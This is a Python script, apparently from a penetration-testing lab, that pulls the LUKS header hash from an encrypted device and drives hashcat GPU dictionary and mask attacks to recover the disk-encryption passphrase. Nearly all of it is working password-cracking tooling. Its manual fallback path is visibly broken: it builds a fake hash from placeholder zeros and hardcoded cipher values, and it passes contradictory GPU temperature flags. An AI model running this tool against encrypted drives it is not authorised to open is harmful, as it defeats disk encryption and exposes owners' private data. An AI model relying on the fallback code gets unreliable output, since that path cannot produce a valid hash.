#!/usr/bin/env python3
"""
LUKS Hashcat Integration Tool
Advanced hashcat integration for LUKS PBKDF2 exploitation with GPU optimization

Author: Penetration Testing Lab
Target: LUKS PBKDF2 key slots vulnerable to GPU acceleration
"""

import subprocess
import os
import re
import json
import time
from pathlib import Path
from typing import Dict, List, Optional

class LUKSHashcatIntegration:
    """Advanced hashcat integration for LUKS attacks"""
    
    def __init__(self, hashcat_path: str = None):
        self.hashcat_path = hashcat_path or self._find_hashcat()
        self.luks_mode = 14600  # Hashcat mode for LUKS
        self.session_dir = Path("/tmp/luks_sessions")
        self.session_dir.mkdir(exist_ok=True)
        
    def _find_hashcat(self) -> Optional[str]:
        """Find hashcat binary"""
        candidates = [
            '/usr/bin/hashcat',
            '/usr/local/bin/hashcat', 
            '/opt/hashcat/hashcat.bin',
            'hashcat'
        ]
        
        for candidate in candidates:
            try:
                result = subprocess.run([candidate, '--version'], 
                                      capture_output=True, check=True)
                print(f"[INFO] Found hashcat: {candidate}")
                return candidate
            except (subprocess.CalledProcessError, FileNotFoundError):
                continue
        
        return None
    
    def extract_luks_hash_advanced(self, device_path: str, slot_id: int) -> Optional[str]:
        """Advanced LUKS hash extraction with better format support"""
        try:
            # Create temporary files
            header_backup = f"/tmp/luks_header_{os.getpid()}.img"
            hash_output = f"/tmp/luks_hash_{os.getpid()}.txt"
            
            # Backup LUKS header
            subprocess.run([
                'cryptsetup', 'luksHeaderBackup', device_path,
                '--header-backup-file', header_backup
            ], check=True)
            
            # Try using luks2john if available
            try:
                result = subprocess.run([
                    'luks2john', '-S', str(slot_id), header_backup
                ], capture_output=True, text=True, check=True)
                
                # Convert john format to hashcat format
                john_hash = result.stdout.strip()
                hashcat_hash = self._convert_john_to_hashcat(john_hash)
                
                with open(hash_output, 'w') as f:
                    f.write(hashcat_hash + '\n')
                
                # Clean up header backup
                os.unlink(header_backup)
                
                return hash_output
                
            except (subprocess.CalledProcessError, FileNotFoundError):
                # Fallback to manual extraction
                print("[INFO] luks2john not found, using manual extraction")
                return self._manual_hash_extraction(device_path, slot_id, header_backup)
                
        except Exception as e:
            print(f"[ERROR] Hash extraction failed: {e}")
            return None
    
    def _convert_john_to_hashcat(self, john_hash: str) -> str:
        """Convert John the Ripper LUKS hash to hashcat format"""
        # John format: filename:$luks$version$cipher$...
        # Hashcat format: $luks$version$cipher$...
        
        if ':' in john_hash:
            return john_hash.split(':', 1)[1]
        return john_hash
    
    def _manual_hash_extraction(self, device_path: str, slot_id: int, header_backup: str) -> Optional[str]:
        """Manual LUKS hash extraction when luks2john is not available"""
        try:
            # Get LUKS header info
            result = subprocess.run([
                'cryptsetup', 'luksDump', device_path
            ], capture_output=True, text=True, check=True)
            
            # Parse header information
            header_info = self._parse_luks_header(result.stdout, slot_id)
            
            if not header_info:
                print(f"[ERROR] Could not find enabled slot {slot_id}")
                return None
            
            # Read binary data from header backup
            with open(header_backup, 'rb') as f:
                header_data = f.read()
            
            # Extract salt and other parameters
            # This is a simplified version - real implementation needs proper binary parsing
            salt_offset = int(header_info.get('salt_offset', '0'), 16) if 'salt_offset' in header_info else 0
            
            # Create hashcat-compatible hash
            hashcat_hash = self._build_hashcat_hash(header_info, header_data)
            
            hash_output = f"/tmp/luks_hash_{os.getpid()}.txt"
            with open(hash_output, 'w') as f:
                f.write(hashcat_hash + '\n')
            
            # Clean up
            os.unlink(header_backup)
            
            return hash_output
            
        except Exception as e:
            print(f"[ERROR] Manual extraction failed: {e}")
            return None
    
    def _parse_luks_header(self, dump_output: str, target_slot: int) -> Dict:
        """Parse cryptsetup luksDump output for specific slot"""
        lines = dump_output.split('\n')
        slot_info = {}
        in_target_slot = False
        
        for line in lines:
            line = line.strip()
            
            if f'Key Slot {target_slot}:' in line and 'ENABLED' in line:
                in_target_slot = True
                slot_info['enabled'] = True
            elif line.startswith('Key Slot') and in_target_slot:
                break
            elif in_target_slot and ':' in line:
                key, value = line.split(':', 1)
                key = key.strip().lower().replace(' ', '_')
                value = value.strip()
                slot_info[key] = value
        
        return slot_info if slot_info.get('enabled') else {}
    
    def _build_hashcat_hash(self, header_info: Dict, header_data: bytes) -> str:
        """Build hashcat-compatible LUKS hash"""
        # Simplified hash construction
        # Real implementation would properly parse binary header
        
        version = "2"
        cipher = "aes"
        mode = "xts-plain64" 
        hash_algo = "sha256"
        iterations = header_info.get('iterations', '1000').replace(',', '')
        
        # Extract or generate salt (simplified)
        salt = header_info.get('salt', '0' * 64)[:64]
        
        # Key material digest (simplified)
        digest = '0' * 64
        
        return f"$luks${version}${cipher}${mode}${hash_algo}${iterations}${salt}${digest}"
    
    def run_optimized_attack(self, hash_file: str, attack_config: Dict) -> Dict:
        """Run optimized hashcat attack with GPU acceleration"""
        if not self.hashcat_path:
            return {'error': 'hashcat not available'}
        
        session_name = f"luks_attack_{int(time.time())}"
        session_file = self.session_dir / f"{session_name}.session"
        
        # Build hashcat command
        cmd = [
            self.hashcat_path,
            '-m', str(self.luks_mode),  # LUKS mode
            '-a', str(attack_config.get('attack_mode', 0)),  # Attack mode
            '--session', session_name,
            '--force',  # Ignore warnings
            '--optimized-kernel-enable',
            '--workload-profile', '4',  # Insane performance
            '--status',
            '--status-timer', '30',
            '--remove',  # Remove cracked hashes
            '--outfile', f"/tmp/luks_cracked_{session_name}.txt",
            '--outfile-format', '2',  # Format: hash:password
        ]
        
        # Add GPU-specific optimizations
        if attack_config.get('gpu_optimization', True):
            cmd.extend([
                '--gpu-temp-abort', '90',  # Thermal protection
                '--gpu-temp-disable',      # Disable temp monitoring for max speed
                '--backend-ignore-opencl', # Use CUDA if available
            ])
        
        # Add target hash file
        cmd.append(hash_file)
        
        # Add attack-specific parameters
        if attack_config['attack_mode'] == 0:  # Dictionary
            cmd.append(attack_config['wordlist'])
        elif attack_config['attack_mode'] == 3:  # Mask
            cmd.append(attack_config['mask'])
        
        # Add rules if specified
        if 'rules' in attack_config:
            cmd.extend(['-r', attack_config['rules']])
        
        print(f"[INFO] Starting optimized hashcat attack")
        print(f"[CMD] {' '.join(cmd)}")
        
        start_time = time.time()
        
        try:
            # Run attack with timeout
            timeout = attack_config.get('timeout', 7200)  # 2 hours default
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            end_time = time.time()
            
            # Parse results
            attack_result = {
                'session_name': session_name,
                'duration': end_time - start_time,
                'return_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'success': result.returncode == 0,
                'command': ' '.join(cmd)
            }
            
            # Check for cracked password
            outfile = f"/tmp/luks_cracked_{session_name}.txt"
            if Path(outfile).exists():
                with open(outfile, 'r') as f:
                    cracked_content = f.read().strip()
                
                if cracked_content:
                    # Parse hashcat output format
                    if ':' in cracked_content:
                        _, password = cracked_content.rsplit(':', 1)
                        attack_result['password'] = password
                        print(f"[SUCCESS] Password cracked: {password}")
            
            # Parse status information
            attack_result['status'] = self._parse_hashcat_status(result.stdout)
            
            return attack_result
            
        except subprocess.TimeoutExpired:
            print(f"[TIMEOUT] Attack timed out after {timeout} seconds")
            return {'error': f'Attack timed out after {timeout} seconds', 'session': session_name}
        
        except Exception as e:
            return {'error': f'Attack failed: {e}'}
    
    def _parse_hashcat_status(self, output: str) -> Dict:
        """Parse hashcat status output for performance metrics"""
        status = {
            'hash_rate': None,
            'progress': None,
            'eta': None,
            'temperature': [],
            'utilization': []
        }
        
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            
            # Extract hash rate
            if 'H/s' in line:
                rate_match = re.search(r'(\d+\.?\d*)\s*([kMGT]?)H/s', line)
                if rate_match:
                    rate = float(rate_match.group(1))
                    unit = rate_match.group(2)
                    
                    multipliers = {'k': 1e3, 'M': 1e6, 'G': 1e9, 'T': 1e12}
                    if unit in multipliers:
                        rate *= multipliers[unit]
                    
                    status['hash_rate'] = rate
            
            # Extract progress
            elif 'Progress' in line:
                progress_match = re.search(r'(\d+\.?\d*)%', line)
                if progress_match:
                    status['progress'] = float(progress_match.group(1))
            
            # Extract ETA
            elif 'ETA:' in line:
                eta_match = re.search(r'ETA:\s*([^)]+)', line)
                if eta_match:
                    status['eta'] = eta_match.group(1).strip()
            
            # Extract GPU temperature
            elif 'Temp:' in line:
                temp_matches = re.findall(r'(\d+)c', line)
                status['temperature'] = [int(temp) for temp in temp_matches]
            
            # Extract GPU utilization
            elif 'Util:' in line:
                util_matches = re.findall(r'(\d+)%', line)
                status['utilization'] = [int(util) for util in util_matches]
        
        return status
    
    def resume_session(self, session_name: str) -> Dict:
        """Resume a previous hashcat session"""
        if not self.hashcat_path:
            return {'error': 'hashcat not available'}
        
        cmd = [
            self.hashcat_path,
            '--session', session_name,
            '--restore'
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=7200)
            
            return {
                'session_name': session_name,
                'return_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'success': result.returncode == 0
            }
            
        except subprocess.TimeoutExpired:
            return {'error': 'Session resume timed out'}
        except Exception as e:
            return {'error': f'Session resume failed: {e}'}
    
    def list_sessions(self) -> List[str]:
        """List available hashcat sessions"""
        sessions = []
        
        for session_file in self.session_dir.glob("*.session"):
            sessions.append(session_file.stem)
        
        return sessions
    
    def get_gpu_info(self) -> Dict:
        """Get GPU information for attack optimization"""
        if not self.hashcat_path:
            return {'error': 'hashcat not available'}
        
        try:
            # Get device info
            result = subprocess.run([
                self.hashcat_path, '-I'
            ], capture_output=True, text=True, timeout=30)
            
            gpu_info = {
                'devices': [],
                'opencl_available': False,
                'cuda_available': False
            }
            
            lines = result.stdout.split('\n')
            current_device = None
            
            for line in lines:
                line = line.strip()
                
                if line.startswith('Backend Device ID'):
                    current_device = {'id': line.split()[-1]}
                elif current_device and line.startswith('Name'):
                    current_device['name'] = line.split(':', 1)[1].strip()
                elif current_device and line.startswith('Processor(s)'):
                    current_device['processors'] = line.split(':', 1)[1].strip()
                elif current_device and line.startswith('Memory.Global'):
                    current_device['memory'] = line.split(':', 1)[1].strip()
                    gpu_info['devices'].append(current_device)
                    current_device = None
            
            # Check for CUDA/OpenCL support
            if 'CUDA' in result.stdout:
                gpu_info['cuda_available'] = True
            if 'OpenCL' in result.stdout:
                gpu_info['opencl_available'] = True
            
            return gpu_info
            
        except Exception as e:
            return {'error': f'GPU info failed: {e}'}
    
    def optimize_attack_config(self, gpu_info: Dict, attack_type: str) -> Dict:
        """Generate optimized attack configuration based on GPU capabilities"""
        config = {
            'gpu_optimization': True,
            'timeout': 7200,  # 2 hours
            'workload_profile': 4  # Maximum performance
        }
        
        # Adjust based on available memory
        total_memory_gb = 0
        if gpu_info.get('devices'):
            for device in gpu_info['devices']:
                memory_str = device.get('memory', '0')
                # Parse memory (e.g., "8192 MB")
                memory_match = re.search(r'(\d+)', memory_str)
                if memory_match:
                    memory_mb = int(memory_match.group(1))
                    total_memory_gb += memory_mb / 1024
        
        # Adjust attack parameters based on memory
        if total_memory_gb >= 8:
            config['workload_profile'] = 4  # Maximum
        elif total_memory_gb >= 4:
            config['workload_profile'] = 3  # High
        else:
            config['workload_profile'] = 2  # Medium
        
        # Attack-specific optimizations
        if attack_type == 'dictionary':
            config['attack_mode'] = 0
            # Enable optimized kernels for dictionary attacks
            config['optimized_kernel'] = True
        elif attack_type == 'mask':
            config['attack_mode'] = 3
            # Mask attacks benefit from more aggressive optimization
            if total_memory_gb >= 6:
                config['timeout'] = 14400  # 4 hours for mask attacks
        
        return config


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='LUKS Hashcat Integration Tool')
    parser.add_argument('action', choices=['extract', 'attack', 'gpu-info', 'sessions'])
    parser.add_argument('-d', '--device', help='LUKS device path')
    parser.add_argument('-s', '--slot', type=int, default=0, help='Key slot')
    parser.add_argument('-w', '--wordlist', help='Wordlist file')
    parser.add_argument('-m', '--mask', help='Mask pattern')
    parser.add_argument('-r', '--rules', help='Hashcat rules file')
    parser.add_argument('-t', '--timeout', type=int, default=7200, help='Attack timeout')
    parser.add_argument('--resume', help='Resume session name')
    
    args = parser.parse_args()
    
    integration = LUKSHashcatIntegration()
    
    if args.action == 'gpu-info':
        gpu_info = integration.get_gpu_info()
        print(json.dumps(gpu_info, indent=2))
    
    elif args.action == 'sessions':
        sessions = integration.list_sessions()
        print("Available sessions:")
        for session in sessions:
            print(f"  {session}")
    
    elif args.action == 'extract':
        if not args.device:
            print("[ERROR] Device path required")
            return
        
        hash_file = integration.extract_luks_hash_advanced(args.device, args.slot)
        if hash_file:
            print(f"[SUCCESS] Hash extracted to: {hash_file}")
        else:
            print("[ERROR] Hash extraction failed")
    
    elif args.action == 'attack':
        if not args.device:
            print("[ERROR] Device path required")
            return
        
        # Extract hash first
        hash_file = integration.extract_luks_hash_advanced(args.device, args.slot)
        if not hash_file:
            print("[ERROR] Hash extraction failed")
            return
        
        # Prepare attack config
        attack_config = {
            'timeout': args.timeout
        }
        
        if args.wordlist:
            attack_config['attack_mode'] = 0
            attack_config['wordlist'] = args.wordlist
        elif args.mask:
            attack_config['attack_mode'] = 3
            attack_config['mask'] = args.mask
        else:
            print("[ERROR] Either wordlist or mask required")
            return
        
        if args.rules:
            attack_config['rules'] = args.rules
        
        # Run attack
        result = integration.run_optimized_attack(hash_file, attack_config)
        
        if 'error' in result:
            print(f"[ERROR] {result['error']}")
        else:
            print(f"[INFO] Attack completed in {result['duration']:.2f} seconds")
            if 'password' in result:
                print(f"[SUCCESS] Password found: {result['password']}")
            else:
                print("[INFO] Password not cracked")


if __name__ == "__main__":
    main()